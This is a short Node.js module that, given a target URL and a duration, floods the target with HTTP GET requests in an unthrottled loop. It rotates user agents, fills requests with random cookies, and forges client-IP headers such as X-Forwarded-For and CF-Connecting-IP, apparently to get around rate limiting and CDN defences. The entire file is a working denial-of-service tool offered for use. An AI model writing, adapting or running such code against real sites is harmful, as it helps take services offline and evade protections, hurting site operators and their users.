const http = require("http");
const https = require("https");
const { URL } = require("url");

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
  "Mozilla/5.0 (X11; Linux x86_64)",
  "curl/7.68.0",
  "Wget/1.20.3"
];

function fakeIP() {
  return Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join(".");
}

function randomCookie() {
  return Array(10).fill(0).map(() => {
    return `cookie${Math.random().toString(36).substring(2)}=${Math.random().toString(36)}`;
  }).join("; ");
}

function randomHeaders(hostname) {
  const ip = fakeIP();
  return {
    "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)],
    "Referer": "https://" + hostname + "/?" + Math.random().toString(36).substring(2),
    "X-Forwarded-For": ip,
    "Client-IP": ip,
    "CF-Connecting-IP": ip,
    "True-Client-IP": ip,
    "Cookie": randomCookie()
  };
}

module.exports = function (target, duration) {
  const url = new URL(target);
  const client = url.protocol === "https:" ? https : http;
  const end = Date.now() + duration * 1000;

  function send() {
    const options = {
      method: "GET",
      hostname: url.hostname,
      path: url.pathname + url.search || "/",
      port: url.port || (url.protocol === "https:" ? 443 : 80),
      headers: randomHeaders(url.hostname)
    };

    const req = client.request(options, res => {
      console.log(`[${res.statusCode}] from ${url.hostname} using GET`);
      res.on("data", () => {});
    });
    req.on("error", () => {});
    req.end();
  }

  function loop() {
    if (Date.now() >= end) return;
    for (let i = 0; i < 20; i++) send();
    setImmediate(loop);
  }

  loop();
};
